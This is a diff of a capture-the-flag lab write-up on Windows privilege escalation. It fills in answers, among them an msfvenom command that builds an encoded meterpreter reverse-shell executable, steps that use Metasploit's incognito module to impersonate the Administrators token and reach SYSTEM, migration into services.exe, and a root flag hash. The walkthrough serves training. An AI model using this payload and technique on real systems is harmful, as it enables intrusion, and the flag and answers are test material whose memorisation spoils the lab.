@@ -156,13 +156,11 @@ This should spawn a meterpreter shell for you!</p>
 
 <p><br></p>
 
-![image](https://github.com/user-attachments/assets/96599c2e-c0c5-4f8c-af6d-49892287c40d)
-
-
-
 
 > 2.1 - <em>What is the final size of the exe payload that you generated?</em><br>
->> <strong>_______</strong>
+>> <strong>73802</strong><br>
+>> <code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe</code>
+![image](https://github.com/user-attachments/assets/96599c2e-c0c5-4f8c-af6d-49892287c40d)
 
 <p><br></p>
 
@@ -206,12 +204,50 @@ There's more reading here.  (inserit LINK)<br><br>
 
 > 3.1 - <em>View all the privileges using whoami /priv</em><br>
 >> <strong>No answer needed</strong>
+![image](https://github.com/user-attachments/assets/70bee5aa-6aeb-4230-9acc-0f5e2efa61b8)
+
 
 <p><br></p>
 
 <p>You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability.</p>
 
 <p><br></p>
+
+![image](https://github.com/user-attachments/assets/dc919c89-fe8a-419e-9407-136e24a79706)
+
+![image](https://github.com/user-attachments/assets/940ebefe-0b97-4311-b656-6ef8a49ac5bf)
+
+![image](https://github.com/user-attachments/assets/50928581-b1f5-4f93-9942-a9879d398e66)
+
+![image](https://github.com/user-attachments/assets/4f9e39c8-fbc4-46cc-a20c-16842a8f1ea6)
+
+![image](https://github.com/user-attachments/assets/f10136f7-253b-4b98-b19d-1350b14b5c9a)
+
+![image](https://github.com/user-attachments/assets/91916afd-63e6-44f8-9125-18d253e5fe66)
+
+![image](https://github.com/user-attachments/assets/5bc4a15d-2f8d-48fb-88a5-b55097688dfe)
+
+![image](https://github.com/user-attachments/assets/e701e932-ff3e-4ee2-aa6f-9df3f780674a)
+
+![image](https://github.com/user-attachments/assets/944b6356-985e-4bec-af8c-172c8fdaa5c3)
+
+![image](https://github.com/user-attachments/assets/868d253c-fee1-477d-b978-65a41697f931)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 > 3.2 - <em>Enter: load incognito to load the incognito module in Metasploit. Please note that you may need to use the use incognito command if the previous command doesn't work. Also, ensure that your Metasploit is up to date.</em><br>
 >> <strong>No answer needed</strong>
@@ -223,7 +259,10 @@ There's more reading here.  (inserit LINK)<br><br>
 <p><br></p>
 
 > 3.3 - <em>Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token. What is the output when you run the getuid command?</em><br>
->> <strong>_______</strong>
+>> <strong>NT AUTHORITY\SYSTEM</strong>
+
+![image](https://github.com/user-attachments/assets/470702c0-e336-492f-8e47-ced6373ee0ed)
+
 
 <p><br></p>
 
@@ -232,12 +271,12 @@ There's more reading here.  (inserit LINK)<br><br>
 <p><br></p>
 
 > 3.4 - <em>Ensure that you migrate to a process with correct permissions (the above question's answer). The safest process to pick is the services.exe process. First, use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS</em><br>
->> <strong>_______</strong>
+>> <strong>No answer needed</strong>
 
 <p><br></p>
 
 > 3.5 - <em>Read the root.txt file located at C:\Windows\System32\config</em><br>
->> <strong>_______</strong>
+>> <strong>dff0f748678f280250f25a45b8046b4a</strong>
 
 <p><br></p>
 
